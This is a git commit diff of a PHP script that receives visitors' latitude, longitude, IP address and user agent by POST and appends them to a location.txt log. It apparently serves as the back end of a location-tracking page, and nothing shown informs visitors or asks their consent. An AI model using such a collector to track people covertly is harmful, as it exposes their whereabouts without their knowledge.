e03631ca711a227775ece466955502a665fc2ed8
Isaac Osei <114262806+Dailysteps@users.noreply.github.com>
2024-10-07 12:57:49 -0700

    Update process.php

--- process.php
+++ process.php
@@ -1,10 +1,29 @@
 <?php
-$latitude = $_POST['latitude'];
-$longitude = $_POST['longitude'];
-$ipAddress = $_POST['ipAddress'];
-$userAgent = $_POST['userAgent'];
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Get the data sent via POST request
+    $latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
+    $longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
+    $userAgent = isset($_POST['userAgent']) ? $_POST['userAgent'] : 'Unknown';
+    $ipAddress = isset($_POST['ip']) ? $_POST['ip'] : 'Unknown';
 
-$fileContent = "Latitude: $latitude\nLongitude: $longitude\nIP Address: $ipAddress\nUser Agent: $userAgent\n\n";
+    // Format the data to write to the file
+    $log = "IP Address: $ipAddress\n";
+    $log .= "Latitude: $latitude\n";
+    $log .= "Longitude: $longitude\n";
+    $log .= "User Agent: $userAgent\n";
+    $log .= "--------------------------\n";
 
-file_put_contents('location.txt', $fileContent, FILE_APPEND);
+    // Define the path to the log file
+    $file = 'location.txt';
+
+    // Write data to the file
+    $myfile = fopen($file, "a") or die("Unable to open file!");
+    fwrite($myfile, $log);
+    fclose($myfile);
+
+    // Send a response back to the client
+    echo "Data saved successfully!";
+} else {
+    echo "Invalid request method.";
+}
 ?>
